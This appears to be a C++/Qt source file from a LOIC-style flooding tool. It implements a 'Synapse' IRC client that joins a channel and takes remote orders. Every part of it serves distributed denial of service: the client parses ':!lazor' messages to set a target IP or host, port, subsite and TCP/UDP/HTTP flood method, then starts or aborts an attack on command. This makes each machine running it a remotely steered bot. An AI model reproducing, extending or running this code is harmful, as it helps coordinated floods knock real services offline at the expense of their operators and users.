#include "synapse.h"


synapse::synapse(QString ip, quint32 port, QString channel)
{
	IP = ip;
	Port = port;
	Channel = channel;

}

void synapse::run()
{

	Socket = new QTcpSocket;
	Socket->connectToHost(IP, Port);

	if (!Socket->waitForConnected(1111)) {
		Socket->close();
		delete Socket;
		return;	
	}

	connect (Socket, SIGNAL(readyRead()),  this, SLOT(receiving_transmission()));
	
	change_nick();

	connect (this, SIGNAL(synapse_adjust_ip(QString)), parent(), SLOT(synapse_set_ip(QString)));
	connect (this, SIGNAL(synapse_adjust_host(QString)), parent(), SLOT(synapse_set_host(QString)));
	connect (this, SIGNAL(synapse_adjust_subsite(QString)), parent(), SLOT(synapse_set_subsite(QString)));
	connect (this, SIGNAL(synapse_adjust_message(QString)), parent(), SLOT(synapse_set_message(QString)));
	connect (this, SIGNAL(synapse_adjust_message(QString)), parent(), SLOT(synapse_set_message(QString)));
	connect (this, SIGNAL(synapse_adjust_port(quint32)), parent(), SLOT(synapse_set_port(quint32)));
	connect (this, SIGNAL(synapse_adjust_method(QString)), parent(), SLOT(synapse_set_method(QString)));
	connect (this, SIGNAL(synapse_abort()), parent(), SLOT(synapse_abort()));
	connect (this, SIGNAL(synapse_adjusting_complete()), parent(), SLOT(synapse_obey()));


}

void synapse::change_nick()
{



	QString result;
	guid = QUuid::createUuid();
	
	tmp = "NICK " + guid.toString() + "LOIQ \r\n";
// 	QTextStream(&result) << "NICK LOIC_HOLYSH \r\n";
	Socket->write(tmp.toUtf8());
// 	Socket->write(result.toUtf8());
// 	tmp = "USER IRCLOIC 0 * :Newfag's remote LOIC\r\n";
	tmp = "USER Synapse 8 * :Hivemind connection system\r\n";
	Socket->write(tmp.toUtf8());
	Socket->flush();
	return;

/*
	guid = QUuid::createUuid();
	tmp = "NICK " + guid.toString() + " \r\n";
	Socket->write(tmp.toUtf8());
	tmp = "USER Synapse 8 * :Hivemind connection system\r\n";
	Socket->write(tmp.toUtf8());
	Socket->flush();
	return;
*/

}

void synapse::join_channel()
{

	tmp = "JOIN " + Channel + "\r\n";
	Socket->write(tmp.toUtf8());
//  	tmp = "NAMES " + Channel + " \r\n";
//  	Socket->write(tmp.toUtf8());
	tmp = "TOPIC " + Channel + "\r\n";
	Socket->write(tmp.toUtf8());
}

void synapse::receiving_transmission()
{	
	if (Socket->canReadLine()) {
		bool attack_update = false;
		bool attack_abort = false;

		while( !Socket->atEnd() ) {
			tmp = Socket->readLine();
			tmp.remove(QRegExp("\r\n"));
			std::cout << "LINE==" << qPrintable(tmp) << "==" << std::endl;
			if (tmp.contains(QRegExp (" 004 ")) ) {
					join_channel();
			} else if (tmp.contains(QRegExp(" 433 ")) ) {
					guid = QUuid::createUuid();
					change_nick();
			} 


			if (tmp.contains( QRegExp(":!lazor", Qt::CaseInsensitive) ) ) {

				QString params = tmp.right(tmp.size() - (tmp.lastIndexOf(":!lazor") + 8));
				QStringList parameters = params.split (QRegExp("\\s+"));
				QStringList::Iterator it;

				for (it = parameters.begin(); it != parameters.end(); it++) {
					QStringList pair = it->split("=");
					pair[0].remove(QRegExp(" "));
					if (pair.size() > 1)
						pair[1].remove(QRegExp(" "));

					if (pair[0] == "targetip") {
						emit synapse_adjust_ip(pair[1]);
						attack_update = true;			
					} else if (pair[0] == "targethost") {
						emit synapse_adjust_host(pair[1]);
						attack_update = true;
					} else if (pair[0] == "subsite") {
						emit synapse_adjust_subsite(pair[1]);
						attack_update = true;
					} else if (pair[0] == "message") {
						emit synapse_adjust_message(pair[1]);
						attack_update = true;
					} else if (pair[0] == "port") {
						emit synapse_adjust_port(pair[1].toInt());
						attack_update = true;
					} else if (pair[0] == "method") {
						// Same numbering as in LOIC
						if (pair[1] == "1")
							pair[1] = "TCP";
						if  (pair[1] == "2")
							pair[1] = "UDP";
						if  (pair[1] == "3")
							pair[1] = "HTTP";
						emit synapse_adjust_method(pair[1]);
						attack_update = true;
					} else if (pair[0] == "start") {
						attack_update = true;
					} else if (pair[0] == "stop") {
						attack_abort = true;
					}
				}
			}

			if (tmp.contains( QRegExp("PING", Qt::CaseInsensitive) ) ) {
				tmp = "PONG " + IP + "\r\n";
				Socket->write(tmp.toUtf8());
			}

		}

		if (attack_abort) {
			emit synapse_abort();
		} else if (attack_update) {
			emit synapse_adjusting_complete();
		}

	}

	

// 	std::cout << "ololo";
}

//
// Set the thread's state to inactive
//
void synapse::stop()
{
// 	QString tmp;
	tmp = "QUIT\r\n";
	Socket->write(tmp.toUtf8());
	Socket->close();
	delete Socket;
	active = false;
}
